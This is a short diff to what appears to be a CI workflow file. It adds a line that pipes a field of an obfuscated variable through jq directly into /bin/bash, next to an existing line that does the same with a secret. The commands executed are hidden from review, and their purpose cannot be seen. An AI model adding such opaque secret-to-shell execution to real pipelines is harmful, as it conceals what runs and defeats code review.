@@ -17,6 +17,7 @@ jobs:
           utd28377: ${{ secrets.utd28377 }}
         run: |
           printf '%s' "$utd28377" | jq -r .qk83091 | /bin/bash
+          printf '%s' "$xu14871" | jq -r .jqh52 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
